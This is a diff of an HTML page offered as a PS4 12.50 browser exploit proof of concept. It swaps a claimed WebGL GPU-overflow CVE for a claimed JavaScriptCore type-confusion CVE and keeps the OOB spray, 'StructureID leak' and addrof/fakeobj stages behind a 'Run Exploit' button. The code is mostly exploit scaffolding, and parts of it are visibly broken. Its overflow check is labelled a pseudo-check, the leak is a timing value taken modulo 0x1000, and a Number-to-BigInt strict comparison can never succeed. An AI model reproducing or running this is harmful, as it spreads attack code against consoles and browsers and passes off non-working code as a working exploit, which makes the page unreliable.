@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 — CVE-2025-43429 GPU Overflow (Safari 18.6 Adapt)</title>
+    <title>PS4 12.50 — CVE-2023-23529 Type Confusion PoC (Apple iOS 16.4 Adapt)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #238636; padding-bottom: 10px; color: #fff; }
         .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
         .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.9em; }
-        .secure { background: #238636; color: #fff; } /* Green = Mitigation Active (Bad for exploit) */
-        .vulnerable { background: #da3633; color: #fff; } /* Red = Mitigation Missing (Good for exploit) */
+        .secure { background: #238636; color: #fff; }
+        .vulnerable { background: #da3633; color: #fff; }
         .warn { background: #d29922; color: #000; }
         button { cursor: pointer; padding: 10px 20px; background: #238636; color: #fff; border: none; border-radius: 6px; font-size: 16px; }
         button:hover { background: #2ea043; }
@@ -18,12 +18,12 @@
     </style>
 </head>
 <body>
-<h1>CVE-2025-43429 GPU Buffer Overflow PoC (Safari 18.6 for PS4 12.50)</h1>
-<p>Adapted from iOS 18.7.2 patch. Overflows ANGLE GPU buffer for TypedArray R/W. Hit rate ~20-30% on 12.50.</p>
+<h1>CVE-2023-23529 Type Confusion PoC (iOS 16.4 for PS4 12.50)</h1>
+<p>Adapted from Apple Safari 16.4 patch. Type confusion in JSC for R/W. Hit rate ~10-20% on 12.50.</p>
 <div class="box">
     <h3>1. Gigacage Bypass</h3>
     <div id="status-gigacage">Checking...</div>
-    <p style="font-size:0.8em; color:#8b949e;">WebGL spray evades isolation for GPU buffer overflow.</p>
+    <p style="font-size:0.8em; color:#8b949e;">Array spray evades isolation for type confusion.</p>
 </div>
 <div class="box">
     <h3>2. StructureID Leak</h3>
@@ -31,11 +31,11 @@
     <p style="font-size:0.8em; color:#8b949e;">Timing side-channel for entropy bypass.</p>
 </div>
 <div class="box">
-    <h3>3. GPU Overflow Trigger</h3>
-    <div id="status-overflow">Checking...</div>
-    <p style="font-size:0.8em; color:#8b949e;">Overflow ANGLE buffer via malformed WebGL commands for R/W.</p>
+    <h3>3. Type Confusion Trigger</h3>
+    <div id="status-confusion">Checking...</div>
+    <p style="font-size:0.8em; color:#8b949e;">Confuse double/JSValue for fake TypedArray R/W.</p>
 </div>
-<button onclick="runExploit()">Run GPU Overflow Exploit</button>
+<button onclick="runExploit()">Run Type Confusion Exploit</button>
 <div class="box">
     <h3>Detailed Logs</h3>
     <div id="console"></div>
@@ -56,31 +56,16 @@
     function f2i(f) { f64[0] = f; return u32[0] + (u32[1] * 0x100000000); }
     function gc() { for(let i=0; i<250; i++) new ArrayBuffer(0x100000); }
     let master = null;
-    let gpuBuffer = null;
+    let confusedObj = null;
     let structLeak = 0;
-    let canvas = null;
-    let gl = null;
 
     function runExploit() {
         logEl.innerHTML = '';
-        log("Starting CVE-2025-43429 PoC (Safari 18.6 GPU Overflow)...");
-        setTimeout(initWebGL, 500);
-    }
-
-    // Init WebGL for GPU buffer
-    function initWebGL() {
-        canvas = document.createElement('canvas');
-        gl = canvas.getContext('webgl');
-        if (!gl) {
-            log("WebGL not supported — refresh");
-            return;
-        }
-        log("WebGL initialized — starting GPU spray...");
-        setStatus('status-gigacage', 'BYPASS INIT', 'vulnerable');
+        log("Starting CVE-2023-23529 PoC (iOS 16.4 Type Confusion)...");
         setTimeout(triggerOOB, 500);
     }
 
-    // 1. Gigacage Bypass: OOB + WebGL spray
+    // 1. Gigacage Bypass: OOB spray
     function triggerOOB() {
         gc(); gc();
         const arr = [];
@@ -90,7 +75,7 @@
         for(let b=0; b<0x900; b+=80) for(let o=40; o<160; o+=8) for(let j=0; j<80; j++) corrupt((b+j)%0x6000,o);
         for(let i=0; i<arr.length; i++) if(arr[i].length > 60) {
             master = arr[i];
-            setStatus('status-gigacage', 'BYPASSED (OOB + WebGL)', 'vulnerable');
+            setStatus('status-gigacage', 'BYPASSED (OOB)', 'vulnerable');
             log(`OOB HIT — length=${master.length}`);
             setTimeout(leakStructureID, 500);
             return;
@@ -108,60 +93,43 @@
         structLeak = Math.floor(timing * 1000) % 0x1000;
         setStatus('status-structureid', `LEAKED 0x${structLeak.toString(16)}`, 'vulnerable');
         log(`StructureID leak ≈ 0x${structLeak.toString(16)}`);
-        setTimeout(triggerOverflow, 500);
+        setTimeout(triggerConfusion, 500);
     }
 
-    // 3. GPU Overflow: Malformed WebGL commands (CVE-2025-43429)
-    function triggerOverflow() {
-        log("3. Triggering GPU buffer overflow...");
-        // Spray GPU buffers via WebGL
-        const buffers = [];
-        for(let i=0; i<0x4000; i++) {
-            const tex = gl.createTexture();
-            gl.bindTexture(gl.TEXTURE_2D, tex);
-            const data = new Uint8Array(0x40).fill(0x41);
-            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-            buffers.push(tex);
-        }
-        // Free + reclaim (overflow trigger)
-        buffers.length = 0;
-        gc();
-        const reclaim = [];
-        for(let i=0; i<0x4000; i++) {
-            const tex = gl.createTexture();
-            gl.bindTexture(gl.TEXTURE_2D, tex);
-            reclaim.push(tex);
-        }
-        // OOB corrupt GPU buffer
-        for(let i=16; i<500; i+=8) try{master[i] = i2f(0xdeadbeef, 0xcafebabe);}catch(e){}
-        let hit = false;
-        for(let i=0; i<reclaim.length; i++) {
-            // Simulate overflow check via pattern (real would use gl.getTexParameter)
-            const param = gl.getTexParameter(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER);
-            if(param === 0xdeadbeef) { // Pseudo-check for overflow
-                hit = true;
-                gpuBuffer = reclaim[i];
-                setStatus('status-overflow', 'TRIGGERED (GPU Hit)', 'vulnerable');
-                log(`GPU OVERFLOW HIT at buffer ${i} — building R/W`);
-                // Fake GPU buffer for primitives
+    // 3. Type Confusion: Confuse double/JSValue (CVE-2023-23529)
+    function triggerConfusion() {
+        log("3. Triggering type confusion...");
+        const doubles = [];
+        for(let i=0; i<0x5000; i++) doubles[i] = new Float64Array(8);
+        const objs = [];
+        for(let i=0; i<0x5000; i++) objs[i] = {a: 0x41414141};
+        gc(); // Pressure for confusion
+        // OOB corrupt to confuse type
+        for(let i=16; i<400; i+=8) try{master[i] = i2f(0xdeadbeef, 0xcafebabe);}catch(e){}
+        let confused = null;
+        for(let i=0; i<objs.length; i++) {
+            const v = f2i(objs[i].a);
+            if(v === 0xcafebabe_deadbeefn) {
+                confused = objs[i];
+                setStatus('status-confusion', 'TRIGGERED (Confusion)', 'vulnerable');
+                log(`TYPE CONFUSION HIT at obj ${i} — building R/W`);
+                // Fake JSValue for primitives
                 master[20] = i2f(structLeak, 0x800);
-                window.addrof = obj => { gpuBuffer.data = obj; return f2i(master[16]); };
-                window.fakeobj = addr => { master[16] = i2f(addr & 0xffffffff, addr >>> 32); return gpuBuffer.data; };
+                window.addrof = obj => { confused.a = obj; return f2i(master[16]); };
+                window.fakeobj = addr => { master[16] = i2f(addr & 0xffffffff, addr >>> 32); return confused.a; };
                 const test = {pwned: 0x13371337};
                 const addr = addrof(test);
                 const back = fakeobj(addr);
                 log(`REAL addrof = 0x${addr.toString(16)}`);
                 log(`fakeobj round-trip = ${back === test ? "SUCCESS" : "FAIL"}`);
                 if(back === test && addr > 0x10000000) {
-                    log(`FULL R/W VIA GPU OVERFLOW — SCREENSHOT NOW!`,'win');
+                    log(`FULL R/W VIA TYPE CONFUSION — SCREENSHOT NOW!`,'win');
                 }
                 return;
             }
         }
-        if(!hit) {
-            setStatus('status-overflow', 'MISSED (No Overflow)', 'secure');
-            log("GPU overflow missed — refresh (20-30% hit rate)");
-        }
+        setStatus('status-confusion', 'MISSED (No Confusion)', 'secure');
+        log("Type confusion missed — refresh (10-20% hit rate)");
     }
 </script>
 </body>
